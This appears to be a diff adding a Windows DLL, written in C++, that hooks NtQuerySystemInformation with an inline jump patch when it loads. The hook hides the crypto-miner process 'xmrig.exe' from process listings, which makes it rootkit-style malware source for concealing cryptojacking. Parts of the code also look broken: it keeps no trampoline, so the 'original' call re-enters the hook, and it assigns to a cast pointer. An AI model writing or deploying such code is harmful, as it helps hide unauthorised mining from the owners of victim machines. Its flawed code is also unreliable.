@@ -1,0 +1,77 @@
+#include <Windows.h>
+#include <winternl.h>
+#include <string>
+
+#pragma comment(lib, "ntdll.lib")
+
+typedef NTSTATUS(WINAPI* PNTQUERYSYSTEMINFORMATION)(
+    SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG
+);
+
+PNTQUERYSYSTEMINFORMATION OriginalNtQuerySystemInformation = nullptr;
+std::wstring hiddenProcName = L"xmrig.exe";
+
+NTSTATUS WINAPI HookedNtQuerySystemInformation(
+    SYSTEM_INFORMATION_CLASS SystemInformationClass,
+    PVOID SystemInformation,
+    ULONG SystemInformationLength,
+    PULONG ReturnLength
+) {
+    NTSTATUS status = OriginalNtQuerySystemInformation(
+        SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength
+    );
+
+    if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(status)) {
+        auto pCurrent = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
+        PSYSTEM_PROCESS_INFORMATION pPrev = nullptr;
+
+        while (pCurrent) {
+            if (pCurrent->ImageName.Buffer &&
+                _wcsicmp(pCurrent->ImageName.Buffer, hiddenProcName.c_str()) == 0) {
+                if (pPrev) {
+                    if (pCurrent->NextEntryOffset)
+                        pPrev->NextEntryOffset += pCurrent->NextEntryOffset;
+                    else
+                        pPrev->NextEntryOffset = 0;
+                } else {
+                    if (pCurrent->NextEntryOffset)
+                        (BYTE*)SystemInformation = (BYTE*)SystemInformation + pCurrent->NextEntryOffset;
+                    else
+                        SystemInformation = nullptr;
+                }
+            } else {
+                pPrev = pCurrent;
+            }
+
+            if (pCurrent->NextEntryOffset == 0)
+                break;
+
+            pCurrent = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pCurrent + pCurrent->NextEntryOffset);
+        }
+    }
+
+    return status;
+}
+
+void Hook() {
+    HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
+    if (hNtDll) {
+        OriginalNtQuerySystemInformation = (PNTQUERYSYSTEMINFORMATION)GetProcAddress(hNtDll, "NtQuerySystemInformation");
+
+        DWORD oldProtect;
+        VirtualProtect(OriginalNtQuerySystemInformation, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
+
+        uintptr_t relativeAddress = ((uintptr_t)HookedNtQuerySystemInformation - (uintptr_t)OriginalNtQuerySystemInformation - 5);
+        *(BYTE*)OriginalNtQuerySystemInformation = 0xE9;
+        *(DWORD*)((BYTE*)OriginalNtQuerySystemInformation + 1) = (DWORD)relativeAddress;
+
+        VirtualProtect(OriginalNtQuerySystemInformation, 5, oldProtect, &oldProtect);
+    }
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason, LPVOID lpReserved) {
+    if (ul_reason == DLL_PROCESS_ATTACH) {
+        Hook();
+    }
+    return TRUE;
+}
